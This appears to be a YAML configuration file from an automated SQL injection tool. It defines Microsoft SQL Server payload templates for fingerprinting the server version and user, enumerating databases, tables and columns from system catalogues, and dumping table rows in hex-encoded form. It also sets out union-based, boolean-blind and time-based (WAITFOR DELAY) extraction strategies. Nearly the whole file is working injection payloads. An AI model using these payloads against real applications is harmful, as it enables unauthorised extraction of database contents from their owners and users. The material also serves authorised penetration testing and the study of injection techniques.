vendor: SQL Server

resource:
 info: |
  SELECT
      %20@@version
      %2B'${enclose_value_sql}'
      %2BDB_NAME()
      %2B'${enclose_value_sql}'
      %2Buser
      %2B'${trail_sql}'

 schema:
  database: |
   SELECT
       replace(
           CONVERT(
               VARCHAR(MAX),
               CONVERT(
                   VARBINARY(MAX),
                   '0'%2bSTUFF(
                       (
                           SELECT replace(sys.fn_varbintohexstr(CAST(
                               ','
                               %2b'${enclose_value_sql}'
                               %2BCAST(name AS VARCHAR(MAX))
                               %2B'${separator_qte_sql}0${enclose_value_sql}'
                               AS VARBINARY(MAX)
                           )),'0x','')
                           FROM (
                               select
                                   name,
                                   ROW_NUMBER() OVER (ORDER BY(SELECT 1)) AS rnum
                               from master..sysdatabases
                           )x
                           where 1=1
                           ${limit}
                           FOR XML PATH('')
                       ),
                       1,
                       1,
                       ''
                   ),
                   2
               )
           )
           %2B '${trail_sql}',
           ',',
           '${separator_cell_sql}'
       )

  table: |
   SELECT
       replace(
           CONVERT(
               VARCHAR(MAX),
               CONVERT(
                   VARBINARY(MAX),
                   '0'%2bSTUFF(
                       (
                           SELECT replace(sys.fn_varbintohexstr(CAST(
                               ','
                               %2b'${enclose_value_sql}'
                               %2BCAST(name AS VARCHAR(MAX))
                               %2B'${separator_qte_sql}0${enclose_value_sql}'
                               AS VARBINARY(MAX)
                           )),'0x','')
                           FROM (
                               select
                                   name,
                                   ROW_NUMBER() OVER (ORDER BY(SELECT 1)) AS rnum
                               from ${database}..sysobjects
                               WHERE xtype='U'
                           )x
                           where 1=1
                           ${limit}
                           FOR XML PATH('')
                       ),
                       1,
                       1,
                       ''
                   ),
                   2
               )
           )
           %2B '${trail_sql}',
           ',',
           '${separator_cell_sql}'
       )

  column: |
   SELECT
       replace(
           CONVERT(
               VARCHAR(MAX),
               CONVERT(
                   VARBINARY(MAX),
                   '0'%2bSTUFF(
                       (
                           SELECT replace(sys.fn_varbintohexstr(CAST(
                               ','
                               %2b'${enclose_value_sql}'
                               %2BCAST(name AS VARCHAR(MAX))
                               %2B'${separator_qte_sql}0${enclose_value_sql}'
                               AS VARBINARY(MAX)
                           )),'0x','')
                           FROM (
                               select
                                   c.name,
                                   ROW_NUMBER() OVER (ORDER BY(SELECT 1)) AS rnum
                               FROM
                                   ${database}..syscolumns c,
                                   ${database}..sysobjects t
                               WHERE c.id=t.id
                               AND t.name='${table}'
                           )x
                           where 1=1
                           ${limit}
                           FOR XML PATH('')
                       ),
                       1,
                       1,
                       ''
                   ),
                   2
               )
           )
           %2B '${trail_sql}',
           ',',
           '${separator_cell_sql}'
       )

  row:
   query: |
    SELECT
        replace(
            CONVERT(
                VARCHAR(MAX),
                CONVERT(
                    VARBINARY(MAX),
                    '0'%2bSTUFF(
                        (
                            SELECT
                                replace(sys.fn_varbintohexstr(CAST(
                                    ','
                                    %2b'${enclose_value_sql}'
                                    %2BCAST(${fields} AS VARCHAR(MAX))
                                    %2B'${separator_qte_sql}0${enclose_value_sql}'
                                    AS VARBINARY(MAX)
                                )),'0x','')
                            FROM (
                                select
                                    *,
                                    ROW_NUMBER() OVER (ORDER BY(SELECT 1)) AS rnum
                                FROM ${database}.dbo.${table}
                            )x
                            where 1=1
                            ${limit}
                            FOR XML PATH('')
                        ),
                        1,
                        1,
                        ''
                    ),
                    2
                )
            )
            %2B '${trail_sql}',
            ',',
            '${separator_cell_sql}'
        )
   fields:
    field: |
     LTRIM(
         RTRIM(
             coalesce(
                 ${field.value},
                 ''
             )
         )
     )
    concat: "%2b '%7f' %2b"

strategy:
 configuration:
  slidingWindow: |
   (
       select
           '${lead}'
           %2Bsubstring(
               (${injection}),
               ${window.char},
               65536
           )
   )
  limit: and rnum BETWEEN ${limit.value} AND 65536
  failsafe: CONVERT(varchar, (1337${indice}7330%2b1))
  calibrator: replicate(${calibrator_hex}, 1024)
  limitBoundary: 1
  endingComment: --+-
  fingerprint:
   errorMessage:
    - "[Microsoft][SQL Server"
    - SQL Server

 normal:
  indices: union select ${indices}
  capacity: (select concat('${lead}${indice}', ${calibrator}))
  orderBy: order by 1337

 boolean:
  test:
   falses:
    - 1 = 0
    - "'a' %21= 'a'"
    - "'b' %21= 'b'"
    - 1 = 2
    - 1 %21= 1
    - 2 %21= 2
   trues:
    - 1 = 1
    - 0 = 0
    - "'a' %21= 'b'"
    - "'a' = 'a'"
    - 2 = 2
    - 1 %21= 2
   initialization: 0%2b1 = 1
   bit: |
    0 != (
        ascii(
            substring(
                ${injection},
                ${window.char},
                1
            )
        )
        %26 ${bit}
    )
   length: len(${injection}) > ${window.char}
  modeAnd: and
  modeOr: or
  blind: ${boolean.mode} ${test}
  # TODO no boolean mode here on Time for sqlserver
  time: |
   ; if (${test})
       WAITFOR DELAY '00:00:00'
   else
       WAITFOR DELAY '00:00:${sleep_time}'
  
